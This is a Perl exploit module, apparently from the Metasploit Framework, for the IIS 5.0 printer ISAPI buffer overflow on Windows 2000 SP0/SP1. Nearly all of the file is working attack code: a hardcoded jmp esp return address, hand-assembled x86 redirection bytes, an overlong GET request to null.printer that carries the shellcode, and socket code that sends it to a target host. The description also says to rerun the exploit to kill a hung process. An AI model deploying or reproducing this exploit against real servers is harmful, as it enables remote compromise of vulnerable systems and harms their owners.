package Msf::Exploit::iis50_printer_overflow;
use base "Msf::Exploit";
use strict;

my %info =
(
    'Name'  => 'IIS 5.0 Printer Buffer Overflow',
    'Version'  => '2.0',
    'Author'  => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win2000', 'win32' ],
    'Priv'  => 0,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 80],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Size'  => 900,
                 'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
                 },
    
    'Description'  => "This exploits a buffer overflow in the request processor of the Internet ".
                      "Printing Protocol ISAPI module in IIS. This module works against Windows ".
                      "2000 service pack 0 and 1. If the service stops responding after ".
                      "a successful compromise, run the exploit a couple more times to completely ".
                      "kill the hung process.",
               
    'Refs'  =>  [  
                    'http://lists.insecure.org/lists/bugtraq/2001/May/0011.html',
                ],
    'Targets' => [
                   ['Windows 2000 SP0/SP1'],
                 ],
);

sub new {
    my $class = shift;
    my $obj = $class->SUPER::new({'Info' => \%info}, @_);
    return $obj;
}

sub Exploit 
{
    my ($obj, $opt) = @_;
    select(STDOUT);$|++;
    
    my $shellcode = $opt->{"SHELLCODE"};
    
    # jmp esp in compfilt.dll - opcode database cross-referencing rocks :)
    my $ret = 0x732c45f3;

    my $pattern = ("\x90" x 280);
    substr($pattern, 268, 4, pack("L", $ret));

    # payload is at: [ebx + 96] + 256 + 64
    $pattern .= "\x8b\x4b\x60";         # mov ecx, [ebx + 96]
    $pattern .= "\x80\xc1\x40";         # add cl, 64
    $pattern .= "\x80\xc5\x01";         # add ch, 1
    $pattern .= "\x89\xe5";             # mov ebp, esp (not necessary)
    $pattern .= "\xff\xe1";             # jmp ecx

    my $request = "GET http://$pattern/null.printer?$shellcode HTTP/1.0\r\n\r\n";

    printf ("[*] Trying to return to esp at 0x%.8x\n", $ret);

    my $s = Pex::Socket->new({"SSL" => $opt->{"SSL"}});
    if (! $s->tcp($opt->{"RHOST"}, $opt->{"RPORT"}))
    {
        print "[*] Error: " . $s->get_error() . "\n";
        exit(0);
    }

    $s->send($request);
    sleep(2);
    $s->close();
}

1;
